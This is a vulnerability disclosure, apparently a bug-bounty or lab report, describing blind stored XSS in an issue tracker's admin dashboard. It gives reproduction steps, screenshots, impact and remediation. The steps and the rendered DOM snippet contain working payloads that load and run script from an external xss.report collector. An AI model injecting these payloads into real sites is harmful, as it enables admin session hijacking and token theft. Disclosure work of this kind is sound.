## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Bug Title and Description Fields on IssuePilot Admin Dashboard.

## Affected URL

https://issuepilot.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the bug report submission handler of the IssuePilot platform. User-supplied input submitted through bug report fields (such as Bug title and Description) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user reviews submitted bug reports within the admin dashboard, the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the administrative user's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application submission interface: `https://issuepilot.pwnedbox.site/submit.php`.
2. Locate the bug reporting form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the Bug title and Description fields).
3. Submit the bug report form.
4. Log into the administrative control panel where stored reports are reviewed (`https://issuepilot.pwnedbox.site/admin/` dashboard).
5. Observe that the stored payload executes in the DOM of the administrative dashboard, firing requests to the external collector (`xss.report`).

## POC
<img width="1227" height="1335" alt="image" src="https://github.com/user-attachments/assets/87124c7c-8987-44ef-9f8e-1f6b8ed11bd0" />

<img width="1920" height="1031" alt="image" src="https://github.com/user-attachments/assets/776d7057-3b77-4931-bb33-5c974b738e68" />


### Vulnerable DOM Snippet

```html
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Dashboard — IssuePilot</title><link rel="stylesheet" href="../assets/style.css"></head><body class="adminbody"><header class="adminnav"><a class="brand" href="../index.php"><span class="mark">↗</span> IssuePilot</a><div style="display:flex;gap:14px;align-items:center"><span class="muted" style="font-size:13px">Admin workspace</span><a class="btn" href="logout.php">Sign out</a></div></header><main class="adminmain"><div class="adminhead"><div><h1>Bug reports</h1><div class="muted" style="margin-top:5px">Review, triage and resolve incoming reports.</div></div><a class="btn purple" href="../submit.php">Submit a test report</a></div><div class="stats"><div class="stat"><b>2</b><span>Total reports</span></div><div class="stat"><b>2</b><span>New</span></div><div class="stat"><b>0</b><span>In progress</span></div><div class="stat"><b>0</b><span>Resolved / closed</span></div></div><form class="toolbar" method="get"><input class="input" name="q" value="" placeholder="Search title, description or email"><select class="select" name="status"><option value="">All statuses</option><option value="new">New</option><option value="triaged">Triaged</option><option value="in_progress">In Progress</option><option value="resolved">Resolved</option><option value="closed">Closed</option></select><select class="select" name="severity"><option value="">All severity</option><option value="low">Low</option><option value="medium">Medium</option><option value="high">High</option><option value="critical">Critical</option></select><button class="btn primary">Filter</button></form><div class="tablewrap"><table class="table"><thead><tr><th>Report</th><th>Severity</th><th>Status</th><th>Reporter</th><th>Created</th><th></th></tr></thead><tbody><tr><td><strong>#2 · '"&gt;<script src="https://xss.report/c/vansh"></script></strong><div class="muted" style="margin-top:4px;max-width:480px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'"&gt;<script src="https://xss.report/c/vansh"></script></div></td><td class="sev-medium">Medium</td><td><span class="badge b-new">New</span></td><td>Anonymous</td><td>Nov 9, 2026 · 02:06</td><td><a class="btn" href="view.php?id=2">Open</a></td></tr><tr><td><strong>#1 · '"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></strong><div class="muted" style="margin-top:4px;max-width:480px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></div></td><td class="sev-medium">Medium</td><td><span class="badge b-new">New</span></td><td>hello@gmail.com</td><td>Oct 22, 2026 · 04:09</td><td><a class="btn" href="view.php?id=1">Open</a></td></tr></tbody></table></div></main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>

<iframe class="html2canvas-container" width="1920" height="1031" scrolling="no" data-html2canvas-ignore="true" style="visibility: hidden; position: fixed; left: -10000px; top: 0px; border: 0px;"></iframe></body></html>
```
## Impact

1. Execution of arbitrary JavaScript code within the high-privilege session of an administrator reviewing stored bug reports.
2. Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of bug report statuses or application data.
3. Persistent code execution affecting backend triage handlers and staff moderation panels.

## Remediation

1. Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in administrative tables, dashboards, or detail views.
2. Apply strict input validation and sanitization policies on all bug report submission endpoints (Title, Description, Steps to Reproduce, etc.) to reject or neutralize HTML markup and script tags.
3. Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains

